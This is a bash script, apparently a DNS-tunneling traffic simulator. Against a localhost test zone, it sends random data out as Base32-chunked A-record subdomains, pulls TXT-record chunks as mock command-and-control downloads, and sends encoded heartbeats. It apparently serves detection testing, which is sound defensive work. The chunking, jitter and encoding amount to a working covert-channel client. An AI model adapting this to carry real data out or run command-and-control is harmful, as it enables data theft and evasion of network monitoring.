#!/bin/bash

# ==============================================================================
# SIMDNS ADVANCED ATTACK SIMULATOR
# 
# Profile 1: EXFILTRATION (Outbound)
#   - Method: Data encoded in A-record subdomains.
#   - Characteristic: High-entropy, high-volume subdomains (The "Push").
# 
# Profile 2: C2 / INFILTRATION (Inbound)
#   - Method: Data returned in TXT record responses via chunked queries.
#   - Characteristic: Small queries followed by large TXT responses (The "Pull").
# ==============================================================================

# --- Configuration ---
SERVER="127.0.0.1"
ZONE="test.local"
SESSION_ID="s_$(date +%s)"

# Timing & Cadence
HEARTBEAT_INTERVAL=5
MAX_HEARTBEAT_GAP=10

# Probability Engine (0-100)
PROB_EXFIL_A=20             # % chance to push data OUT via A-records
PROB_C2_TXT=20              # % chance to pull data IN via TXT records

# --- Core Functions ---

# Encodes data using Base32 to ensure DNS compatibility (RFC 4648)
encode_data() {
    local input="$1"
    echo -n "$input" | base32 | tr -d '=' | tr -d '\n'
}

# PROFILE 1: EXFILTRATION (Outbound)
# Client "pushes" data by making queries with massive, encoded subdomains.
do_exfiltration_a() {
    # Target a payload size of 200-800 bytes
    local size=$(( (RANDOM % 600) + 200 ))
    local raw_data=$(head -c "$size" /dev/urandom | base64 | tr -dc 'a-zA-Z0-9')
    local encoded=$(encode_data "$raw_data")
    
    echo "[!] ATTACK: EXFILTRATION (Outbound A-Record Burst)"
    echo "    [+] Target Payload Size: $size bytes"

    # Split into 60-char chunks to respect the 63-byte label limit
    IFS=$'\n' read -rd '' -a CHUNKS <<< "$(echo "$encoded" | fold -w 60)"
    
    for i in "${!CHUNKS[@]}"; do
        # Format: <chunk>.<seq>.<session_id>.<zone>
        local query="${CHUNKS[$i]}.${i}.${SESSION_ID}.${ZONE}"
        
        echo "    [>] Querying: $query"
        dig "@$SERVER" "$query" A +short > /dev/null 2>&1
        
        # Rapid fire to simulate a fast data stream
        sleep 0.05
    done
    echo "[+] Exfiltration burst complete."
}

# PROFILE 2: C2 / INFILTRATION (Inbound)
# Client "pulls" data by requesting chunks via TXT records.
do_c2_infiltration() {
    # Target a total download size (e.g., 2KB to 8KB)
    local target_total_bytes=$(( (RANDOM % 6144) + 2048 ))
    local current_collected_bytes=0
    local chunk_count=0

    echo "[!] ATTACK: C2 INFILTRATION (Inbound TXT Download)"
    echo "    [+] Target Download Size: $target_total_bytes bytes"

    while [ "$current_collected_bytes" -lt "$target_total_bytes" ]; do
        ((chunk_count++))
        
        # Small, low-entropy query to request the next chunk
        # The server is expected to respond with the payload in the TXT record.
        local innocent_query="chunk.${chunk_count}.${SESSION_ID}.${ZONE}"
        
        echo "    [>] Requesting chunk $chunk_count..."
        
        # Capture response
        local response=$(dig "@$SERVER" "$innocent_query" TXT +short)
        
        if [ -z "$response" ]; then
            echo "    [!] Error: No response from server. Stopping download."
            break
        fi

        local resp_size=${#response}
        current_collected_bytes=$((current_collected_bytes + resp_size))
        
        echo "    [<] Received chunk $chunk_count: $resp_size bytes (Total: $current_collected_bytes/$target_total_bytes)"
        
        # Mimic network latency/jitter
        sleep 0.2
    done
    echo "[+] Infiltration download complete."
}

# Standard Heartbeat (Encoded to hide pattern from simple string matching)
do_heartbeat() {
    local hb_payload="heartbeat"
    local encoded_hb=$(encode_data "$hb_payload")
    
    # Format: <encoded_hb>.0.<session_id>.<zone>
    local heartbeat_query="${encoded_hb}.0.${SESSION_ID}.${ZONE}"
    
    echo "[.] HEARTBEAT: Sending encoded status check..."
    dig "@$SERVER" "$heartbeat_query" TXT +short > /dev/null 2>&1
}

# --- Main Simulation Loop ---

echo "========================================================"
echo " SIMDNS ADVANCED ATTACK SIMULATOR"
echo " Session ID: $SESSION_ID"
echo " Zone:       $ZONE"
echo "========================================================"

while true; do
    # Roll the dice to decide the next event
    ROLL=$(( RANDOM % 100 ))

    if [ "$ROLL" -lt "$PROB_EXFIL_A" ]; then
        # Scenario: Exfiltrating data via A-records
        do_exfiltration_a

    elif [ "$ROLL" -lt $(( PROB_EXFIL_A + PROB_C2_TXT )) ]; then
        # Scenario: Downloading data via TXT records
        do_c2_infiltration

    else
        # Scenario: Standard Heartbeat
        do_heartbeat
    fi

    # Calculate jittered sleep
    JITTER=$(( (RANDOM % (MAX_HEARTBEAT_GAP - HEARTBEAT_INTERVAL)) + HEARTBEAT_INTERVAL ))
    echo "[*] Idle for $JITTER seconds until next cycle..."
    sleep "$JITTER"
done
